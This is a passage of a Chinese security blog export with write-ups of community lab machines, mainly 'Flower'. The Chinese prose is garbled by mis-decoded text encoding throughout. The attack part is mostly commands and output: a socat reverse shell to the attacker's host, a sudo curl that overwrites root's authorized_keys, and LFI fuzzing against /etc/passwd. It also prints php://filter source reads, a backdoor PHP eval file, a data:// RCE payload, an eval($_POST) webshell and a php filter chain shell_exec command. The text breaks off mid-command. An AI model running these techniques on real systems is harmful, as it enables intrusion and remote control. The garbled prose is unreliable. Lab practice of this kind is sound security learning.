class="line"></span><br><span class="line"><span class="symbol">noport:</span>~<span class="variable">$ </span>sudo /usr/bin/curl <span class="number">192.168</span>.<span class="number">34.11</span><span class="symbol">:</span><span class="number">8080</span>/authorized_keys -o /root/.ssh/authorized_keys</span><br><span class="line">  % <span class="title class_">Total</span>    % <span class="title class_">Received</span> % <span class="title class_">Xferd</span>  <span class="title class_">Average</span> <span class="title class_">Speed</span>   <span class="title class_">Time</span>    <span class="title class_">Time</span>     <span class="title class_">Time</span>  <span class="title class_">Current</span></span><br><span class="line">                                 <span class="title class_">Dload</span>  <span class="title class_">Upload</span>   <span class="title class_">Total</span>   <span class="title class_">Spent</span>    <span class="title class_">Left</span>  <span class="title class_">Speed</span></span><br><span class="line"><span class="number">100</span>   <span class="number">737</span>  <span class="number">100</span>   <span class="number">737</span>    <span class="number">0</span>     <span class="number">0</span>  <span class="number">27723</span>      <span class="number">0</span> --<span class="symbol">:--</span><span class="symbol">:--</span> --<span class="symbol">:--</span><span class="symbol">:--</span> --<span class="symbol">:--</span><span class="symbol">:--</span> <span class="number">28346</span></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/.ssh]</span><br><span class="line">â””â”€<span class="comment"># ssh root@192.168.34.83 -p 80          </span></span><br><span class="line"><span class="title class_">Welcome</span> to <span class="title class_">Alpine</span>!</span><br><span class="line"></span><br><span class="line"><span class="title class_">The</span> <span class="title class_">Alpine</span> <span class="title class_">Wiki</span> contains a large amount of how-to guides <span class="keyword">and</span> general</span><br><span class="line">information about administrating <span class="title class_">Alpine</span> systems.</span><br><span class="line"><span class="title class_">See</span> &lt;<span class="symbol">http:</span>//wiki.alpinelinux.org/&gt;.</span><br><span class="line"></span><br><span class="line"><span class="title class_">You</span> can setup the system <span class="keyword">with</span> the <span class="symbol">command:</span> setup-alpine</span><br><span class="line"></span><br><span class="line"><span class="title class_">You</span> may change this message by editing /etc/motd.</span><br><span class="line"></span><br><span class="line"><span class="symbol">noport:</span>~<span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">0</span>(root),<span class="number">1</span>(bin),<span class="number">2</span>(daemon),<span class="number">3</span>(sys),<span class="number">4</span>(adm),<span class="number">6</span>(disk),<span class="number">10</span>(wheel),<span class="number">11</span>(floppy),<span class="number">20</span>(dialout),<span class="number">26</span>(tape),<span class="number">27</span>(video)</span><br><span class="line"><span class="symbol">noport:</span>~<span class="comment"># </span></span><br></pre></td></tr></table></figure></div>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ul>
<li>åŠ å¼ºäº†ä»£ç å®¡è®¡   <strong>è¿™é‡Œæ²¡æœ‰ç”¨æˆ·ç™»å½•æ³¨é‡Šçš„åœ°æ–¹å°±æ˜¯çªç ´ç‚¹</strong></li>
<li>è™½ç„¶ç»™å‡ºçš„hashä¸æ˜¯å®Œæ•´çš„ï¼Œä½†æ˜¯å¯ä»¥ç¼–å†™ä¸€ä¸ªè„šæœ¬æ¥çˆ†ç ´sha256 æ¯”å¯¹å­—å…¸é‡Œçš„å¯†ç </li>
<li>åå¼¹shellä¹‹åç”¨socatè½¬å‘ç«¯å£</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ”»å‡»æœº</span></span><br><span class="line">./socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 tcp-listen:8888</span><br><span class="line"></span><br><span class="line"><span class="comment"># é¶æœº</span></span><br><span class="line">./socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.34.11:8888</span><br></pre></td></tr></table></figure></div>
<ul>
<li>nginxé…ç½®å¯ä»¥ä¿®æ”¹ï¼ŒæŠŠåŸæ¥çš„80ç«¯å£ä¿®æ”¹æˆè½¬å‘é¶æœºçš„22ç«¯å£</li>
<li>curl -oé€‰é¡¹å†™å…¥æ–‡ä»¶</li>
</ul>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>ç¾¤å‹é¶æœº</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¾¤å‹é¶æœºFlower</title>
    <url>/posts/62580.html</url>
    <content><![CDATA[<p>ç¾¤å‹é¶æœºFlower WPå¤ç°</p>
<span id="more"></span>
<p>è¿™ä¸ªæ˜¯floweråšçš„é¶æœºï¼Œä½†æ˜¯é‡Œé¢çš„çŸ¥è¯†ç‚¹åŸºæœ¬éƒ½æ˜¯æˆ‘ä¸çŸ¥é“çš„ï¼Œæ‰€ä»¥æˆ‘å°±è·Ÿç€ç¾¤ä¸»å’Œå¤§ä½¬çš„wpå¤ç°ï¼Œå­¦åˆ°äº†ä¸å°‘</p>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.112.83                          </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">22</span> <span class="number">15</span>:<span class="number">35</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">112.83</span>)</span><br><span class="line">Host is up (<span class="number">0.0020</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span><span class="operator">+</span>deb10u4 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> c2:<span class="number">91</span>:d9:a5:f7:a3:<span class="number">98</span>:<span class="number">1</span>f:c1:<span class="number">4</span>a:<span class="number">70</span>:<span class="number">28</span>:aa:ba:a4:<span class="number">10</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">3</span>e:<span class="number">1</span>f:c9:eb:c0:<span class="number">6</span>f:<span class="number">24</span>:<span class="number">06</span>:fc:<span class="number">52</span>:<span class="number">5</span>f:<span class="number">2</span>f:<span class="number">1</span>b:<span class="number">35</span>:<span class="number">33</span>:ec (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> ec:<span class="number">64</span>:<span class="number">87</span>:<span class="number">04</span>:<span class="number">9</span>a:<span class="number">4</span>b:<span class="number">32</span>:fe:<span class="number">2</span>d:<span class="number">1</span>f:<span class="number">9</span>a:b0:<span class="number">81</span>:d3:<span class="number">7</span>c:cf (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    nginx <span class="number">1.14</span>.<span class="number">2</span></span><br><span class="line">|<span class="params">_http-server-header:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line">|<span class="params">_http-title:</span> \xE5\x87\x9B\xE5\x86\xBD\xE6\x99\x82\xE9\x9B\xA8 <span class="operator">-</span> \xE5\x85\xAC\xE5\xBC\x8F\xE3\x82\xA6\xE3\x82\xA7\xE3\x83\x96\xE3\x82\xB5\xE3\x82\xA4\xE3\x83\x88</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">52</span>:<span class="number">2</span>F:A8:AF:<span class="number">31</span>:<span class="number">4</span>A (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">1.98</span> ms bogon (<span class="number">192.168</span>.<span class="number">112.83</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.73</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>å¼€æ”¾22å’Œ80ç«¯å£ï¼Œç›´æ¥å»webç•Œé¢çœ‹çœ‹</p>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><p>webæ˜¯ä¸€ä¸ªè¿™æ ·çš„ç•Œé¢<br><img src="https://pic1.imgdb.cn/item/67b97e84d0e0a243d401ddbe.png"><br>ç‚¹å‡»ä¸€ä¸ªæŒ‰é’®è¿›å…¥ä¹‹åurlæ˜¯<code>http://192.168.112.83/?do=album_3.php</code><br>å…ˆæ‰«ä¸€ä¸‹ç›®å½•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># dirsearch -u 192.168.112.83                            </span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/_192.168.112.83/_25-02-22_15-40-59.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">112.83</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">15</span>:<span class="number">40</span>:<span class="number">59</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span>                                   </span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span>                                 </span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span></span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span></span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span>                                  </span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span>                                   </span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span></span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span></span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span></span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span></span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span>                                             </span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.html</span></span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span>                                      </span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span></span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">571</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span>                                   </span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">21</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">228</span>B  <span class="operator">-</span> <span class="symbol">/README.md</span>                                        </span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">24</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">16</span>B  <span class="operator">-</span> <span class="symbol">/test.php</span>                                         </span><br><span class="line">[<span class="number">15</span>:<span class="number">41</span>:<span class="number">24</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">17</span>B  <span class="operator">-</span> <span class="symbol">/tools.php</span>                                        </span><br></pre></td></tr></table></figure></div>
<p>README.mdä¸­çš„å†…å®¹æ˜¯ï¼š<br>2025å¹´1æœˆ22æ—¥ æœ¬é¡¹ç›®çš„å¼€å‘æš‚æ—¶åˆ°æ­¤ç»“æŸã€‚åœ¨2æœˆæ­£å¼å…¬å¼€é¡¹ç›®ä¹‹å‰ï¼Œè¯·åŠ¡å¿…æ•´ç†æµ‹è¯•éƒ¨åˆ†ã€‚â€”â€”å¼€å‘å›¢é˜Ÿ é˜¿è¾¾è¥¿<br>è¿™é‡Œè¯´çš„æµ‹è¯•éƒ¨åˆ†ï¼Œå°±æ˜¯testï¼Œç»“æœå°±æ˜¯åœ¨&#x2F;test.phpä¸­æœ‰åé—¨<br>è€Œä¸”æˆ‘ä»¬ç›´æ¥è®¿é—®test.phpå’Œtools.phpæ˜¯æ²¡æœ‰å†…å®¹çš„ï¼Œä½†æ˜¯å®ƒä»¬çš„å¤§å°ä¸æ˜¯0<br>ç”¨wfuzzæ‰«ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt --hw 1 http://192.168.112.83/test.php?FUZZ=/etc/passwd;</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/<span class="strong">__init__</span>.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"><span class="bullet">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"></span><br><span class="line">Target: http://192.168.112.83/test.php?FUZZ=/etc/passwd</span><br><span class="line">Total requests: 4744</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line"><span class="section">ID           Response   Lines    Word       Chars       Payload                                                                                 </span></span><br><span class="line"><span class="section">=====================================================================</span></span><br><span class="line"></span><br><span class="line">000001524:   200        1 L      2 W        27 Ch       &quot;do&quot;                                                                                    </span><br><span class="line"></span><br><span class="line">Total time: 8.807905</span><br><span class="line">Processed Requests: 4744</span><br><span class="line">Filtered Requests: 4743</span><br><span class="line">Requests/sec.: 538.6070</span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªåé—¨å°±æ˜¯doï¼Œç„¶åæˆ‘ä»¬ç”¨phpä¼ªåè®®è¯»ä¸€ä¸‹æ–‡ä»¶çš„å†…å®¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># curl http://192.168.112.83/test.php?do=php://filter/convert.base64-encode/resource=index.php</span></span><br><span class="line">&lt;h1&gt;test&lt;/h1&gt;</span><br><span class="line">PD9waHAKICAgICRhbGJ1bXMgPSBhcnJheSgKICAgICAgICAnYWxidW1fMS5waHAnLAogICAgICAgICdhbGJ1bV8yLnBocCcsCiAgICAgICAgJ2FsYnVtXzMucGhwJywKICAgICAgICAnYWxidW1fNC5waHAnLAogICAgICAgICdhbGJ1bV81LnBocCcsCiAgICAgICAgJ2FsYnVtXzYucGhwJwogICAgKTsKCiAgICBpZihpc3NldCgkX0dFVFsnZG8nXSkgJiYgaW5fYXJyYXkoJF9HRVRbJ2RvJ10sICRhbGJ1bXMpKSB7CiAgICAgICAgaW5jbHVkZSAkX0dFVFsnZG8nXTsgCiAgICB9IGVsc2UgewogICAgICAgIGluY2x1ZGUgJ2hvbWUucGhwJzsKICAgIH0KPz4K</span><br><span class="line"></span><br><span class="line"><span class="comment">#index.php </span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$albums</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;album_1.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;album_2.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;album_3.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;album_4.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;album_5.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;album_6.php&#x27;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>], <span class="variable">$albums</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;home.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$blacklist</span> = <span class="keyword">array</span>(<span class="string">&#x27;writer&#x27;</span>,<span class="string">&#x27;etc&#x27;</span>,<span class="string">&#x27;temp&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;var&#x27;</span>, <span class="string">&#x27;setting&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;cache&#x27;</span>, <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;upload&#x27;</span>, <span class="string">&#x27;download&#x27;</span>, <span class="string">&#x27;include&#x27;</span>, <span class="string">&#x27;require&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;passthru&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;shell_exec&#x27;</span>, <span class="string">&#x27;proc_open&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;pcntl_exec&#x27;</span>, <span class="string">&#x27;phar://&#x27;</span>, <span class="string">&#x27;file://&#x27;</span>, <span class="string">&#x27;zip://&#x27;</span>, <span class="string">&#x27;data://&#x27;</span>, <span class="string">&#x27;glob://&#x27;</span>, <span class="string">&#x27;ftp://&#x27;</span>,<span class="string">&#x27;.log&#x27;</span>);</span><br><span class="line">        <span class="variable">$do</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]);</span><br><span class="line">        <span class="variable">$do</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^A-Za-z0-9\=\.\/\-:]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$do</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$black</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$do</span>, <span class="variable">$black</span>) !== <span class="literal">false</span>||<span class="title function_ invoke__">strpos</span>(<span class="variable">$do</span>, <span class="string">&#x27;../&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;self-hacking!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$do</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>å¯ä»¥çœ‹åˆ°test.phpæ²¡æœ‰è¿‡æ»¤php:&#x2F;&#x2F;ä½†æ˜¯è¿‡æ»¤äº†data:&#x2F;&#x2F; </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># tools.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flowermagic&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flowermagic&#x27;</span>] !== <span class="string">&quot;index.php&quot;</span> )</span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flowermagic&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæ‰§è¡Œpostè¯·æ±‚çš„<code>flowermagic</code>ï¼Œä½†æ˜¯å‰é¢æœ‰ä¸€ä¸ªå‡½æ•°file_get_contentsï¼Œè¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨dataä¼ªåè®®rceæ‰§è¡Œå‘½ä»¤<br>dataä¼ªåè®®çš„ä½¿ç”¨æ–¹å¼æ˜¯<code>data://text/plain;base64,+ï¼ˆå‘½ä»¤çš„base64ï¼‰</code><br><code>flowermagic=data://text/plain;base64,cGhwaW5mbygpOw==</code><br><img src="https://pic1.imgdb.cn/item/67b98304d0e0a243d401e3e2.png"><br>å¯ä»¥æ‰¾åˆ°disable_functionsçœ‹çœ‹å“ªäº›å‡½æ•°è¢«banäº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">passthru,<span class="built_in">exec</span>,system,popen,<span class="built_in">chroot</span>,scandir,<span class="built_in">chgrp</span>,<span class="built_in">chown</span>,escapesh</span><br></pre></td></tr></table></figure></div>
<p>è¿˜æ˜¯æ²¡æœ‰banå¹²å‡€ï¼Œshell_execæ²¡æœ‰banï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯èšå‰‘è¿æ¥ï¼Œä¸€ç§æ˜¯ç”¨phpfilterchainï¼Œéƒ½å­¦ä¹ ä¸€ä¸‹<br>èšå‰‘ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">echo</span> ZXZhbCgkX1BPU1RbMV0pOw== | <span class="built_in">base64</span> -d</span><br><span class="line"><span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]); </span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67b9860cd0e0a243d401e71e.png"><br>åœ¨è¯·æ±‚ä¿¡æ¯è¿™é‡ŒåŠ ä¸Šä¸€ä¸ªhttp body ç”¨dataä¼ªåè®®æ‰§è¡Œevalå‘½ä»¤ï¼Œç„¶åé“¾æ¥å¯†ç å†è¾“å…¥1<br>å°±å¯ä»¥è¿æ¥ä¸Šäº†ï¼Œç„¶åå¯ä»¥æ‰¾åˆ°<code>.2024_12_25_project_web_login_password.bak</code>è¿™ä¸ªæ–‡ä»¶ï¼Œæœ€åéƒ½æ˜¯ç”¨è¿™ä¸ªæ–‡ä»¶é‡Œçš„å†…å®¹<br>filterchainï¼š</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">â”Œâ”€â”€(rootã‰¿kakeru)-[~/php_filter_chain_generator-main]</span></span><br><span class="line"><span class="language-xml">â””â”€# python3 php_filter_chain_generator.py --chain &quot;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">shell_exec</span>(\<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="meta">?&gt;</span></span><span class="language-xml">&quot;</span></span><br></pre></td></tr></table></figure>
